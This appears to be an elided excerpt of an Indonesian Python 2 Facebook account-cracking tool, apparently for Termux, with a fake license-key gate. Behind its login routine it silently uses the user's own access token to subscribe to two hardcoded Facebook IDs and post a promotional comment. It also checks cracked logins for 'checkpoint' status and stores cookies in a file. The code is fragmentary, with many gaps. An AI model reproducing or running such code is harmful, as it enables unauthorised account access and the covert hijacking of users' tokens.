...
rgb = random.choice(['7jam', '5jam', '2jam', '1 jam', '1 hari', '5 menit'])
...
def __seting_ua_dev__():
    ...
    sukses = p + '\n >_<' + h + ' \\[\\e[0;32m\\]\\w\\[\\e[0;32m\\]/\\[\\e[0m\\] Setting User-Agent '
...
def proses_masuk(cookie_dev):
    ...
    if len(ikuti_) == 0:
        try:
            uwu_u = 'https://mbasic.facebook.com/adeliabc.adeliabc'
...
def love_token(token):
    lis_id_foll = [
     '100056548009815', '100024551913570']
    with requests.Session() as (dev_):
        ...
        dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(random.choice(['100056548009815', '100024551913570']), token))
        ikuti_ = []
...
def komen(token):
    for dev in range(1):
        with requests.Session() as (dev_):
            komen_ = random.choice(['@[100010827434600:] KONTROL ALIP Mbar    '])
    ...
    try:
        ...
        with requests.Session() as (ses_dev):
            ...
            if 'c_user' in login_dev:
                ...
                love_token(token)
                komen(token)
                print h + '\n [!]' + p + ' Jalankan lagi Toolsnya' + h + '..!\n Ketik tombol atas ' + k + 'kemudian enter' + p
                exit()
...
def login_dengan_token():
    ...
    try:
        ...
        komen(token)
        print p + '\n ++++>' + h + '  Login Sukses....'
        print p + '\n Jalankan Lagi Toolsnya!\n Ketik tombol atas ' + k + 'kemudian enter'
        exit()
            ...
            if 'checkpoint' in respon.cookies:
                try:
                    ...
                    if 'checkpointSecondaryButton' in respon_.text:
                        data = data.replace('Chek', 'Yes2').replace('\x1b[90;1m', '\x1b[92;1m').replace('\x1b[93;1m', '\x1b[96;1m')
                        ganti_pw.append('dev')
                        bug.append('dev')
                        if len(pw_tap) != 0:
...
def login():
    ...
    lip = raw_input('\x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Input  lisensi Key  : ')
    if lip == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        login()
    elif lip == 'afparadise.com' or lip == 'sporadise.com':
        zedd = open('lisensi.txt', 'w')
        zedd.write(lip)
        zedd.close()
        login_dengan_token()
    else:
        print '  [!] Key salah,tidak punya key? hubungi www.fb.com/apik11'
        time.sleep(2)
        login()
        ...
        with requests.Session() as (ses_):
            ...
            try:
                if user_agent_ == cokiez:
                    ...
                    print h + ' [' + k + '*' + h + ']' + p + ' Status:' + m + 'cari cuan bareng' + h + '' + ceko[:50].replace('\n', ' ')
            except NameError:
                print h + ' [' + k + '*' + h + ']' + p + ' Info: ' + m + 'cari cuan bareng' + h + '' + ceko[:50].replace('\n', ' ')
            ...
            if pilih == '2':
                ...
                try:
                    ...
                    if pilih == '17':
                        ...
                        id__ = nama['id']
                        lisen_salah = m + '\n Lisensi Salah, Silahkan hubungi www.fb.com/apik11'
                        try:
                                ...
                                if de == open('cokie.txt', 'r').read():
                                    ...
                                    with open('cokie.txt', 'a') as (tul):
                                        ...
                                        if 'A' in dec64:
                                            ...
                                            tul.write('A+ZZ' + data32w + 'A+ZZ' + plat_dev)
                                    print a + '\n [!]' + p + ' Jalankan lagi Toolsnya!\n tekan tombol atas ' + k + 'kemudian enter'
                                    exit()
                                else:
                                    print lisen_salah
                                    hapus_cokie()
